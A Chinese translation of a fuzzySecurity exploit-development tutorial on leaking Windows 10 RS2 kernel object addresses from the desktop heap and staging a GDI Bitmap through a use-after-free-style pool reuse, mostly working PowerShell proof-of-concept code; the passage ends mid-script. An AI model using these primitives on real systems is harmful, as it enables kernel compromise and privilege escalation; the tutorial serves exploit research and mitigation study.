---
title: Windows exploit系列教程第十八篇：内核利用程序之RS2 Bitmap巫术
date: 2018-03-19 19:20:11
categories: exploit
tags:
	- windows
	- novice
---
fuzzySecurity于16年更新了数篇Windows内核exp的教程，本文是内核篇的第九篇。[点击查看原文](http://fuzzysecurity.com/tutorials/expDev/22.html)。

<!--more-->

# 内核利用程序之RS2 Bitmap巫术

欢迎来到另一个Windows内核exp开发系列！自上次一别，已是三秋。我已然在我的 [PSKernel-Primitives](https://github.com/FuzzySecurity/PSKernel-Primitives) repo上开源了一些精炼的代码，所以如果你对PowerShell内核pwn感兴趣的话就点个star。

今天我们挖出最喜欢的Windows10 RS2上的Bitmap内核溯源(kernel primitive)。我们跳过RS1，此前我已经发过博文给[@mwrlabs](https://twitter.com/mwrlabs)，其中详述了如何在周年纪念版本中去绕过新的缓解机制，文章在这里[here](https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/)。

我们将使用两种不同的技术来从桌面堆(desktop heap)中泄露Windows对象，此后将使用那些对象，来泄露Bitmap。我强烈推荐你先看看下面的这些资料以了解背景知识。罢了，不跟你多BB，开始吧！

+ Win32k Dark Composition: Attacking the Shadow part of Graphic subsystem (Peng Qui & SheFang Zhong => 360Vulcan) - [here](https://www.slideshare.net/CanSecWest/csw2017-peng-qiushefangzhong-win32k-darkcompositionfinnalfinnalrmmark)

+ LPE vulnerabilities exploitation on Windows 10 Anniversary Update (Drozdov Yurii & Drozdova Liudmila) - [here](http://cvr-data.blogspot.co.uk/2016/11/lpe-vulnerabilities-exploitation-on.html)

+ Morten Schenk's tweet revealing the first technique :D ([@Blomster81](https://twitter.com/Blomster81)) - [here](https://twitter.com/Blomster81/status/844544024224710656)

+ Abusing GDI for ring0 exploit primitives: reloaded ([@NicoEconomou](https://twitter.com/NicoEconomou) & Diego Juarez) - [here](https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf)

+ A Tale Of Bitmaps: Leaking GDI Objects Post Windows 10 Anniversary Edition ([@FuzzySec](http://www.fuzzysecurity.com/tutorials/expDev/22.html)) - [here](https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/)

+ PSKernel-Primitives ([@FuzzySec](http://www.fuzzysecurity.com/tutorials/expDev/22.html)) - [here](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Stage-HmValidateHandleBitmap.ps1)

+ Windows RS2 HmValidateHandle Write-What-Where ([@FuzzySec](http://www.fuzzysecurity.com/tutorials/expDev/22.html)) - [here](https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn/blob/master/Kernel_RS2_WWW_GDI_64.ps1)

## 阻止泄露

我们简单的列出微软用于防止Bitmap泄露而实现的各种缓解机制，同时会说明它们分别该如何绕过。主版本在下面给出作为参考。

**Windows 10 v1511**

+ 当前没有缓解措施。
+ 利用从PEB中拿到的GdiSharedHandleTable句柄，找到正确的GDI_CELL结构体并读出pKernelAddress，它揭示了Bitmap SURFOBJ的内核地址。可以在这里查看一个简单的示例 [here](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Stage-BitmapReadWrite.ps1).。

**Windows 10 RS1 v1607**

- 微软将GDI_CELL结构体中的pKernelAddress置空，老技术从此失效。
- 研究者发现了这样一些对象，它们和我们所垂涎的Bitmap放在相同的内存池中（分页内存池），且可以被泄露。可以通过利用user32来获取gSharedInfo（一个全局变量）的地址，读取出aheList HANDLEENTRY数组的地址，找到正确的那个数组项并最终读出phead成员来获取该对象的内核地址。尽管我们无法直接读出bitmap对象的地址，但通过使用一个较大的尺寸(ensuring the would end up in a low entropy large pool)精心构造/泄露对象并执行一个UAF风格的攻击，就可以使得Bitmap分配在被释放掉的原始对象的位置。可以在这里看到一个简单的示例[here](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Stage-gSharedInfoBitmap.ps1)。

**Windows 10 RS2 v1703**

- 你不知道吗，微软把phead指针也置空了，上述方法也从此失效。
- 本文中我们将讨论如何利用用户映射的桌面堆来泄露Windows对象，和此前做法相似，执行一个UAF风格的攻击来重新溯源Bitmap(primitive)！

![](/images/exploit/fuzzySecurity/20180316_1.jpg)

## Leak 1 => TEB.Win32ClientInfo

我们想做的第一件事就是去泄露tagWND和tagCLS Window结构体的内核地址。我们将以Morten的泄露手法开始，它提供了更好的背景去理解第二部分泄露。

下面的推文给予了我们所有的细节来从用户映射的桌面堆中泄露出地址，同时也告诉了我们如何去t通过用户模式版本计算出内核模式版本(ulClientDelta)的偏移量。

![](/images/exploit/fuzzySecurity/20180316_2.jpg)

看起来指向用户模式版本的指针被存在TEB.Win32ClientInfo+0x28的位置，而指向内核模式版本的指针存在该地址偏移0x28处的更远的地方。Client delta即是内核地址减去用户地址。我们可以简单的把脚本编在一起来获取这个数据。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
 
[StructLayout(LayoutKind.Sequential)]
public struct _THREAD_BASIC_INFORMATION
{
    public IntPtr ExitStatus;
    public IntPtr TebBaseAddress;
    public IntPtr ClientId;
    public IntPtr AffinityMask;
    public IntPtr Priority;
    public IntPtr BasePriority;
}
 
public static class TEB
{
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationThread(
        IntPtr hThread, 
        int ThreadInfoClass,
        ref _THREAD_BASIC_INFORMATION ThreadInfo,
        int ThreadInfoLength,
        ref int ReturnLength);
 
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentThread();
}
"@
 
# Pseudo handle => -2
$CurrentHandle = [TEB]::GetCurrentThread()
 
# ThreadBasicInformation
$THREAD_BASIC_INFORMATION = New-Object _THREAD_BASIC_INFORMATION
$THREAD_BASIC_INFORMATION_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($THREAD_BASIC_INFORMATION)
 
$RetLen = New-Object Int
$CallResult = [TEB]::NtQueryInformationThread($CurrentHandle,0,[ref]$THREAD_BASIC_INFORMATION,$THREAD_BASIC_INFORMATION_SIZE,[ref]$RetLen)
 
$TEBBase = $THREAD_BASIC_INFORMATION.TebBaseAddress
$TEB_Win32ClientInfo = [Int64]$TEBBase+0x800
$TEB_UserKernelDesktopHeap = [System.Runtime.InteropServices.Marshal]::ReadInt64([Int64]$TEBBase+0x828)
$TEB_KernelDesktopHeap = [System.Runtime.InteropServices.Marshal]::ReadInt64($TEB_UserKernelDesktopHeap+0x28)
 
echo "`n[+] _TEB.Win32ClientInfo:     $('{0:X16}' -f $TEB_Win32ClientInfo)"
echo "[+] User Mapped Desktop Heap: $('{0:X16}' -f $TEB_UserKernelDesktopHeap)"
echo "[+] Kernel Desktop Heap:      $('{0:X16}' -f $TEB_KernelDesktopHeap)"
echo "[+] ulClientDelta:            $('{0:X16}' -f ($TEB_KernelDesktopHeap-$TEB_UserKernelDesktopHeap))`n"
```

运行POC，给出如下输出。

![](/images/exploit/fuzzySecurity/20180316_3.jpg)

我们可以简单的在KD中证实。

![](/images/exploit/fuzzySecurity/20180316_4.jpg)

对桌面堆的分析超出了本文的范围，更多信息可以参考[here](https://blogs.msdn.microsoft.com/ntdebugging/2007/01/04/desktop-heap-overview/)。

### 扫描桌面堆

很好，下一步就是创建一个Window对象并扫描桌面堆来找到它。微软在Windows 8之后不再公开tagWND&tagCLS的符号了，所以我们只好在Windows 7上看看 。

![](/images/exploit/fuzzySecurity/20180316_5.jpg)

如我们所见，tagWND的2第一个IntPtr值是Window句柄（通过CreateWindow/Ex返回）。同时也注意到tagWND->THRDESKHEAD->pSelf是一个指向内核中tagWND的指针，我们实际上可以通过内核tagWND的地址减去用户tagWND的地址来计算出ulClientDelta。最后一点需要注意的是tagWND&tagCLS结构体在Windows 10 RS2中有一些变化。通过简单的逆向我们找到了一些变更的相对偏移。

**x64 Pre RS2 (15063)**

+ Window handle => 0x0

+ pSelf => 0x20

+ pcls => 0x98

+ lpszMenuNameOffset => pcls + 0x88


**x64 Post RS2 (15063)**

+ Window handle => 0x0
+ pSelf => 0x20
+ pcls => 0xa8
+ lpszMenuNameOffset => pcls + 0x90

在桌面堆上找到一个Window相当的直接，从桌面堆的基地址开始我们可以读出IntPtr尺寸的值并将其与特定的Window句柄进行比较。一旦我们匹配上了句柄，就掌握了到tagWND结构体起始位置的偏移。更新POC并运行。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
 
[StructLayout(LayoutKind.Sequential)]
public struct _THREAD_BASIC_INFORMATION
{
    public IntPtr ExitStatus;
    public IntPtr TebBaseAddress;
    public IntPtr ClientId;
    public IntPtr AffinityMask;
    public IntPtr Priority;
    public IntPtr BasePriority;
}
 
public class DesktopHeapGDI
{   
    delegate IntPtr WndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);
 
    [System.Runtime.InteropServices.StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
    struct WNDCLASS
    {
        public uint style;
        public IntPtr lpfnWndProc;
        public int cbClsExtra;
        public int cbWndExtra;
        public IntPtr hInstance;
        public IntPtr hIcon;
        public IntPtr hCursor;
        public IntPtr hbrBackground;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string lpszMenuName;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string lpszClassName;
    }
     
    [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
    static extern System.UInt16 RegisterClassW(
        [System.Runtime.InteropServices.In] ref WNDCLASS lpWndClass
    );
 
    [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
    static extern IntPtr CreateWindowExW(
        UInt32 dwExStyle,
        [MarshalAs(UnmanagedType.LPWStr)]
        string lpClassName,
        [MarshalAs(UnmanagedType.LPWStr)]
        string lpWindowName,
        UInt32 dwStyle,
        Int32 x,
        Int32 y,
        Int32 nWidth,
        Int32 nHeight,
        IntPtr hWndParent,
        IntPtr hMenu,
        IntPtr hInstance,
        IntPtr lpParam
    );
 
    [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
    static extern System.IntPtr DefWindowProcW(
        IntPtr hWnd,
        uint msg,
        IntPtr wParam,
        IntPtr lParam
    );
 
    [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
    static extern bool DestroyWindow(
        IntPtr hWnd
    );
 
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationThread(
        IntPtr hThread, 
        int ThreadInfoClass,
        ref _THREAD_BASIC_INFORMATION ThreadInfo,
        int ThreadInfoLength,
        ref int ReturnLength);
 
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentThread();
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void DebugBreak();
 
    private IntPtr m_hwnd;
    public IntPtr CustomWindow(string class_name, string menu_name)
    {
        m_wnd_proc_delegate = CustomWndProc;
 
        WNDCLASS wind_class = new WNDCLASS();
        wind_class.lpszClassName = class_name;
        wind_class.lpszMenuName = menu_name;
        wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
 
        UInt16 class_atom = RegisterClassW(ref wind_class);
        m_hwnd = CreateWindowExW(
            0,
            class_name,
            String.Empty,
            0,
            0,
            0,
            0,
            0,
            IntPtr.Zero,
            IntPtr.Zero,
            IntPtr.Zero,
            IntPtr.Zero
        );
        return m_hwnd;
    }
 
    private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
    {
        return DefWindowProcW(hWnd, msg, wParam, lParam);
    }
 
    private WndProc m_wnd_proc_delegate;
}
"@
 
 
#------------------[Create Window]
 
# Call nonstatic public method => delegWndProc
$DesktopHeapGDI = New-Object DesktopHeapGDI
 
# Menu name buffer
$Buff = "A"*0x8F0
$Handle = $DesktopHeapGDI.CustomWindow("TestWindow",$Buff)
#$Handle.ToInt64()
echo "`n[+] Window handle: $Handle"
 
#------------------[Leak Desktop Heap]
 
# Pseudo handle => -2
$CurrentHandle = [DesktopHeapGDI]::GetCurrentThread()
 
# ThreadBasicInformation
$THREAD_BASIC_INFORMATION = New-Object _THREAD_BASIC_INFORMATION
$THREAD_BASIC_INFORMATION_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($THREAD_BASIC_INFORMATION)
 
$RetLen = New-Object Int
$CallResult = [DesktopHeapGDI]::NtQueryInformationThread($CurrentHandle,0,[ref]$THREAD_BASIC_INFORMATION,$THREAD_BASIC_INFORMATION_SIZE,[ref]$RetLen)
 
$TEBBase = $THREAD_BASIC_INFORMATION.TebBaseAddress
$TEB_Win32ClientInfo = [Int64]$TEBBase+0x800
$TEB_UserKernelDesktopHeap = [System.Runtime.InteropServices.Marshal]::ReadInt64([Int64]$TEBBase+0x828)
$TEB_KernelDesktopHeap = [System.Runtime.InteropServices.Marshal]::ReadInt64($TEB_UserKernelDesktopHeap+0x28)
$ulClientDelta = $TEB_KernelDesktopHeap - $TEB_UserKernelDesktopHeap
 
echo "`n[+] _TEB.Win32ClientInfo:     $('{0:X16}' -f $TEB_Win32ClientInfo)"
echo "[+] User Mapped Desktop Heap: $('{0:X16}' -f $TEB_UserKernelDesktopHeap)"
echo "[+] Kernel Desktop Heap:      $('{0:X16}' -f $TEB_KernelDesktopHeap)"
echo "[+] ulClientDelta:            $('{0:X16}' -f $ulClientDelta)"
 
#------------------[Parse User Desktop Heap]
 
echo "`n[+] Parsing Desktop heap.."
for ($i=0;$i -lt 0xFFFFF;$i=$i+8) {
    $ReadHandle = [System.Runtime.InteropServices.Marshal]::ReadInt64($TEB_UserKernelDesktopHeap + $i)
    if ($ReadHandle -eq $Handle.ToInt64()) {
        echo "[!] w00t, found handle!"
        $UsertagWND = $TEB_UserKernelDesktopHeap + $i
        $KerneltagCLS = [System.Runtime.InteropServices.Marshal]::ReadInt64($UsertagWND + 0xa8)
        break
    }
}
 
echo "`n[+] User tagWND: $('{0:X16}' -f $($UsertagWND))"
echo "[+] User tagCLS: $('{0:X16}' -f $($KerneltagCLS-$ulClientDelta))"
echo "[+] Kernel tagWND: $('{0:X16}' -f $($UsertagWND+$ulClientDelta))"
echo "[+] Kernel tagCLS: $('{0:X16}' -f $($KerneltagCLS))"
echo "[+] Kernel tagCLS.lpszMenuName: $('{0:X16}' -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+0x90)))`n"
 
#------------------[Break]
Start-Sleep -s 20
[DesktopHeapGDI]::DebugBreak()
```

这种读操作没什么问题，我们立即得到了下面的反馈结果。注意到PowerShell提示符没有返回，这是因为我们需要在script退出前断下来。

![](/images/exploit/fuzzySecurity/20180316_6.jpg)

在KD中用dq/db来看看我们成功计算出的所有相对偏移。

![](/images/exploit/fuzzySecurity/20180316_7.jpg)

## Leak 2 => User32::HmValidateHandle

HmValidateHandle第一次被使用是在2011年 [@kernelpool](https://twitter.com/kernelpool)攥写的论文 [Kernel Attacks through User-Mode Callbacks](https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf)中提出的，随后不久这一技术就被用在了各种exp中，包括CVE-2016-7255 [as exploited by Fancy Bear](http://blog.trendmicro.com/trendlabs-security-intelligence/one-bit-rule-system-analyzing-cve-2016-7255-exploit-wild/)。

HmValidateHandle是一个很有意思的函数，我们可以提供一个Window句柄给它，它会返回桌面堆上用户映射的tagWND对象，这简直太好用了！通过这种方式我们可以获取完整的TEB解析和爆破。唯一的问题在于HmValidateHandle并未被user32导出，所以我们需要一些技巧来获取它的地址。

从一大堆公开的解释中我们发现HmValidateHandle与导出的User32::IsMenu函数最近，让我在KD中看看。

![](/images/exploit/fuzzySecurity/20180316_8.jpg)

确实不痛不痒！我们需要做的就是获取User32::IsMenu运行时地址，寻找第一个0xE8字节(call xxx)并攫取出HmValidateHandle的指针。我们可以利用下面的一段代码实现。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
 
public class HmValidateHandleBitmap
{
    delegate IntPtr WndProc(
        IntPtr hWnd,
        uint msg,
        IntPtr wParam,
        IntPtr lParam);
 
    [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
    struct WNDCLASS
    {
        public uint style;
        public IntPtr lpfnWndProc;
        public int cbClsExtra;
        public int cbWndExtra;
        public IntPtr hInstance;
        public IntPtr hIcon;
        public IntPtr hCursor;
        public IntPtr hbrBackground;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string lpszMenuName;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string lpszClassName;
    }
 
    [DllImport("user32.dll")]
    static extern System.UInt16 RegisterClassW(
        [In] ref WNDCLASS lpWndClass);
 
    [DllImport("user32.dll")]
    public static extern IntPtr CreateWindowExW(
        UInt32 dwExStyle,
        [MarshalAs(UnmanagedType.LPWStr)]
        string lpClassName,
        [MarshalAs(UnmanagedType.LPWStr)]
        string lpWindowName,
        UInt32 dwStyle,
        Int32 x,
        Int32 y,
        Int32 nWidth,
        Int32 nHeight,
        IntPtr hWndParent,
        IntPtr hMenu,
        IntPtr hInstance,
        IntPtr lpParam);
 
    [DllImport("user32.dll")]
    static extern System.IntPtr DefWindowProcW(
        IntPtr hWnd,
        uint msg,
        IntPtr wParam,
        IntPtr lParam);
 
    [DllImport("user32.dll")]
    public static extern bool DestroyWindow(
        IntPtr hWnd);
 
    [DllImport("user32.dll")]
    public static extern bool UnregisterClass(
        String lpClassName,
        IntPtr hInstance);
 
    [DllImport("kernel32",CharSet=CharSet.Ansi)]
    public static extern IntPtr LoadLibrary(
        string lpFileName);
 
    [DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)]
    public static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);
 
    public delegate IntPtr HMValidateHandle(
        IntPtr hObject,
        int Type);
 
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateBitmap(
        int nWidth,
        int nHeight,
        uint cPlanes,
        uint cBitsPerPel,
        IntPtr lpvBits);
 
    public UInt16 CustomClass(string class_name, string menu_name)
    {
        m_wnd_proc_delegate = CustomWndProc;
        WNDCLASS wind_class = new WNDCLASS();
        wind_class.lpszClassName = class_name;
        wind_class.lpszMenuName = menu_name;
        wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
        return RegisterClassW(ref wind_class);
    }
 
    private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
    {
        return DefWindowProcW(hWnd, msg, wParam, lParam);
    }
 
    private WndProc m_wnd_proc_delegate;
}
"@
 
#------------------[Create/Destroy Window]
# Call nonstatic public method => delegWndProc
$AtomCreate = New-Object HmValidateHandleBitmap
 
function Create-WindowObject {
    $MenuBuff = "A"*0x8F0
    $hAtom = $AtomCreate.CustomClass("BitmapStager",$MenuBuff)
    [HmValidateHandleBitmap]::CreateWindowExW(0,"BitmapStager",[String]::Empty,0,0,0,0,0,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)
}
 
function Destroy-WindowObject {
    param ($Handle)
    $CallResult = [HmValidateHandleBitmap]::DestroyWindow($Handle)
    $CallResult = [HmValidateHandleBitmap]::UnregisterClass("BitmapStager",[IntPtr]::Zero)
}
 
#------------------[Cast HMValidateHandle]
function Cast-HMValidateHandle {
    $hUser32 = [HmValidateHandleBitmap]::LoadLibrary("user32.dll")
    $lpIsMenu = [HmValidateHandleBitmap]::GetProcAddress($hUser32, "IsMenu")
     
    # Get HMValidateHandle pointer
    for ($i=0;$i-lt50;$i++) {
        if ($([System.Runtime.InteropServices.Marshal]::ReadByte($lpIsMenu.ToInt64()+$i)) -eq 0xe8) {
            $HMValidateHandleOffset = [System.Runtime.InteropServices.Marshal]::ReadInt32($lpIsMenu.ToInt64()+$i+1)
            [IntPtr]$lpHMValidateHandle = $lpIsMenu.ToInt64() + $i + 5 + $HMValidateHandleOffset
        }
    }
 
    if ($lpHMValidateHandle) {
        # Cast IntPtr to delegate
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lpHMValidateHandle,[HmValidateHandleBitmap+HMValidateHandle])
    }
}
 
#------------------[Window Leak]
function Leak-lpszMenuName {
    param($WindowHandle)
    $OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
    $OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
    if ($OSMajorMinor -eq "10.0" -And $OSVersion.Build -ge 15063) {
        $pCLSOffset = 0xa8
        $lpszMenuNameOffset = 0x90
    } else {
        $pCLSOffset = 0x98
        $lpszMenuNameOffset = 0x88
    }
 
    # Cast HMValidateHandle & get window desktop heap pointer
    $HMValidateHandle = Cast-HMValidateHandle
    $lpUserDesktopHeapWindow = $HMValidateHandle.Invoke($WindowHandle,1)
 
    # Calculate all the things
    $ulClientDelta = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+0x20) - $lpUserDesktopHeapWindow.ToInt64()
    $KerneltagCLS = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+$pCLSOffset)
    $lpszMenuName = [System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+$lpszMenuNameOffset)
 
    echo "`n[+] ulClientDelta:              $('{0:X16}' -f $ulClientDelta)"
    echo "[+] User tagWND:                $('{0:X16}' -f $($lpUserDesktopHeapWindow.ToInt64()))"
    echo "[+] User tagCLS:                $('{0:X16}' -f $($KerneltagCLS-$ulClientDelta))"
    echo "[+] Kernel tagWND:              $('{0:X16}' -f $($lpUserDesktopHeapWindow.ToInt64()+$ulClientDelta))"
    echo "[+] Kernel tagCLS:              $('{0:X16}' -f $($KerneltagCLS))"
    echo "[+] Kernel tagCLS.lpszMenuName: $('{0:X16}' -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+0x90)))`n"
}
 
$hWindow = Create-WindowObject
echo "`n[+] Window handle: $hWindow"
Leak-lpszMenuName -WindowHandle $hWindow
```

运行POC，本质上它给了我们和第一种泄露同样的结果，但它更为简洁。

![](/images/exploit/fuzzySecurity/20180316_9.jpg)

## UAF Bitmap

我猜想读者的问题依然是为什么要去关心这些Window对象？我的Bitmap在哪儿？其实，Window菜单名称（lpszMenuName）和bitmap一样，都分配在同一个内核池中。我们可以分配一个较大的Window菜单名称并释放它，此后分配我们的Bitmap就可以重用这段内存了（挖坑到占坑）。这看起来有点巧妙，但是如果我们可以让菜单名称超过4kb的话，他就会用尽低熵大内存池来保证我们的UAF泄露百分百可靠。这一过程和在RS1中使用[Accelerator Tables](https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/)绕过是一致的。

下面的图片阐释了这一过程。

![](/images/exploit/fuzzySecurity/20180316_10.jpg)

该PowerShell函数写在下方。更多的细节请参考我的 [PSKernel-Primitives](https://github.com/FuzzySecurity/PSKernel-Primitives) repo。

```powershell
function Stage-HmValidateHandleBitmap {
<#
.SYNOPSIS
    Universal x64 Bitmap leak using HmValidateHandle.
    Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2
    Resources:
        + Win32k Dark Composition: Attacking the Shadow part of Graphic subsystem <= 360Vulcan
        + LPE vulnerabilities exploitation on Windows 10 Anniversary Update <= Drozdov Yurii & Drozdova Liudmila
 
.DESCRIPTION
    Author: Ruben Boonen (@FuzzySec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.EXAMPLE
    PS C:\Users\b33f> Stage-HmValidateHandleBitmap |fl
     
    BitmapKernelObj : -7692235059200
    BitmappvScan0   : -7692235059120
    BitmapHandle    : 1845828432
     
    PS C:\Users\b33f> $Manager = Stage-HmValidateHandleBitmap
    PS C:\Users\b33f> "{0:X}" -f $Manager.BitmapKernelObj
    FFFFF901030FF000
#>
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
     
    public class HmValidateHandleBitmap
    {   
        delegate IntPtr WndProc(
            IntPtr hWnd,
            uint msg,
            IntPtr wParam,
            IntPtr lParam);
     
        [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
        struct WNDCLASS
        {
            public uint style;
            public IntPtr lpfnWndProc;
            public int cbClsExtra;
            public int cbWndExtra;
            public IntPtr hInstance;
            public IntPtr hIcon;
            public IntPtr hCursor;
            public IntPtr hbrBackground;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string lpszMenuName;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string lpszClassName;
        }
     
        [DllImport("user32.dll")]
        static extern System.UInt16 RegisterClassW(
            [In] ref WNDCLASS lpWndClass);
     
        [DllImport("user32.dll")]
        public static extern IntPtr CreateWindowExW(
            UInt32 dwExStyle,
            [MarshalAs(UnmanagedType.LPWStr)]
            string lpClassName,
            [MarshalAs(UnmanagedType.LPWStr)]
            string lpWindowName,
            UInt32 dwStyle,
            Int32 x,
            Int32 y,
            Int32 nWidth,
            Int32 nHeight,
            IntPtr hWndParent,
            IntPtr hMenu,
            IntPtr hInstance,
            IntPtr lpParam);
     
        [DllImport("user32.dll")]
        static extern System.IntPtr DefWindowProcW(
            IntPtr hWnd,
            uint msg,
            IntPtr wParam,
            IntPtr lParam);
     
        [DllImport("user32.dll")]
        public static extern bool DestroyWindow(
            IntPtr hWnd);
     
        [DllImport("user32.dll")]
        public static extern bool UnregisterClass(
            String lpClassName,
            IntPtr hInstance);
     
        [DllImport("kernel32",CharSet=CharSet.Ansi)]
        public static extern IntPtr LoadLibrary(
            string lpFileName);
     
        [DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)]
        public static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);
     
        public delegate IntPtr HMValidateHandle(
            IntPtr hObject,
            int Type);
     
        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateBitmap(
            int nWidth,
            int nHeight,
            uint cPlanes,
            uint cBitsPerPel,
            IntPtr lpvBits);
     
        public UInt16 CustomClass(string class_name, string menu_name)
        {
            m_wnd_proc_delegate = CustomWndProc;
            WNDCLASS wind_class = new WNDCLASS();
            wind_class.lpszClassName = class_name;
            wind_class.lpszMenuName = menu_name;
            wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
            return RegisterClassW(ref wind_class);
        }
     
        private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
        {
            return DefWindowProcW(hWnd, msg, wParam, lParam);
        }
     
        private WndProc m_wnd_proc_delegate;
    }
"@
     
    #------------------[Create/Destroy Window]
    # Call nonstatic public method => delegWndProc
    $AtomCreate = New-Object HmValidateHandleBitmap
     
    function Create-WindowObject {
        $MenuBuff = "A"*0x8F0
        $hAtom = $AtomCreate.CustomClass("BitmapStager",$MenuBuff)
        [HmValidateHandleBitmap]::CreateWindowExW(0,"BitmapStager",[String]::Empty,0,0,0,0,0,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)
    }
     
    function Destroy-WindowObject {
        param ($Handle)
        $CallResult = [HmValidateHandleBitmap]::DestroyWindow($Handle)
        $CallResult = [HmValidateHandleBitmap]::UnregisterClass("BitmapStager",[IntPtr]::Zero)
    }
     
    #------------------[Cast HMValidateHandle]
    function Cast-HMValidateHandle {
        $hUser32 = [HmValidateHandleBitmap]::LoadLibrary("user32.dll")
        $lpIsMenu = [HmValidateHandleBitmap]::GetProcAddress($hUser32, "IsMenu")
         
        # Get HMValidateHandle pointer
        for ($i=0;$i-lt50;$i++) {
            if ($([System.Runtime.InteropServices.Marshal]::ReadByte($lpIsMenu.ToInt64()+$i)) -eq 0xe8) {
                $HMValidateHandleOffset = [System.Runtime.InteropServices.Marshal]::ReadInt32($lpIsMenu.ToInt64()+$i+1)
                [IntPtr]$lpHMValidateHandle = $lpIsMenu.ToInt64() + $i + 5 + $HMValidateHandleOffset
            }
        }
     
        if ($lpHMValidateHandle) {
            # Cast IntPtr to delegate
            [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lpHMValidateHandle,[HmValidateHandleBitmap+HMValidateHandle])
        }
    }
     
    #------------------[lpszMenuName Leak]
    function Leak-lpszMenuName {
        param($WindowHandle)
        $OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
        $OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
        if ($OSMajorMinor -eq "10.0" -And $OSVersion.Build -ge 15063) {
            $pCLSOffset = 0xa8
            $lpszMenuNameOffset = 0x90
        } else {
            $pCLSOffset = 0x98
            $lpszMenuNameOffset = 0x88
        }
     
        # Cast HMValidateHandle & get window desktop heap pointer
        $HMValidateHandle = Cast-HMValidateHandle
        $lpUserDesktopHeapWindow = $HMValidateHandle.Invoke($WindowHandle,1)
     
        # Calculate ulClientDelta & leak lpszMenuName
        $ulClientDelta = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+0x20) - $lpUserDesktopHeapWindow.ToInt64()
        $KerneltagCLS = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+$pCLSOffset)
        [System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+$lpszMenuNameOffset)
    }
     
    #------------------[Bitmap Leak]
    $KernelArray = @()
    for ($i=0;$i -lt 20;$i++) {
        $TestWindowHandle = Create-WindowObject
        $KernelArray += Leak-lpszMenuName -WindowHandle $TestWindowHandle
        if ($KernelArray.Length -gt 1) {
            if ($KernelArray[$i] -eq $KernelArray[$i-1]) {
